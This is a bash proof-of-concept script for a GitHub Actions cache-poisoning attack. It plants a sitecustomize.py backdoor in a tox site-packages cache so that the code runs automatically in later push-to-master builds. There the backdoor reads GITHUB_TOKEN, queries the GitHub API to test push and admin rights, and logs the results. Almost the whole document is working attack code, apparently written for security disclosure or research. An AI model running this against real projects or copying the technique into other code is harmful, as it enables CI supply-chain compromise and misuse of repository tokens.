#!/bin/bash
echo "========================================="
echo "  CACHE POISONING PoC - Phase 1 (Plant)"
echo "========================================="

echo ""
echo "=== Creating poisoned tox cache ==="
mkdir -p sdks/python/target/.tox/py39/lib/python3.9/site-packages

# The backdoor: sitecustomize.py runs on EVERY Python import
cat > sdks/python/target/.tox/py39/lib/python3.9/site-packages/sitecustomize.py << 'BACKDOOR'
import os, subprocess, json

if os.environ.get("GITHUB_ACTIONS") and os.environ.get("GITHUB_EVENT_NAME") != "pull_request_target":
    # Only trigger on legitimate builds (push/schedule), not on our own PRT
    marker = "/tmp/cache-poison-executed"
    if not os.path.exists(marker):
        with open(marker, "w") as f:
            f.write("CACHE POISON EXECUTED\n")
            f.write(f"Event: {os.environ.get('GITHUB_EVENT_NAME')}\n")
            f.write(f"Repo: {os.environ.get('GITHUB_REPOSITORY')}\n")
            f.write(f"Token length: {len(os.environ.get('GITHUB_TOKEN', ''))}\n")
            f.write(f"Contents perm available: checking...\n")
        
        # If this build has contents:write, we can push to master
        token = os.environ.get("GITHUB_TOKEN", "")
        repo = os.environ.get("GITHUB_REPOSITORY", "")
        if token and repo:
            try:
                import urllib.request
                req = urllib.request.Request(
                    f"https://api.github.com/repos/{repo}",
                    headers={"Authorization": f"token {token}", "Accept": "application/vnd.github.v3+json"}
                )
                resp = urllib.request.urlopen(req)
                data = json.loads(resp.read())
                perms = data.get("permissions", {})
                with open(marker, "a") as f:
                    f.write(f"Push permission: {perms.get('push', 'unknown')}\n")
                    f.write(f"Admin permission: {perms.get('admin', 'unknown')}\n")
                
                if perms.get("push"):
                    with open(marker, "a") as f:
                        f.write("HAS PUSH — could modify master\n")
            except Exception as e:
                with open(marker, "a") as f:
                    f.write(f"Error checking perms: {e}\n")
BACKDOOR

echo "✅ Poisoned sitecustomize.py written to:"
echo "   sdks/python/target/.tox/py39/lib/python3.9/site-packages/"
echo ""
echo "The actions/cache step will now save this to master's cache scope."
echo "Next push-to-master build restoring this cache will execute the backdoor."
echo ""
ls -la sdks/python/target/.tox/py39/lib/python3.9/site-packages/
echo ""
echo "========================================="
echo "  PHASE 1 COMPLETE - Cache will be saved"
echo "========================================="
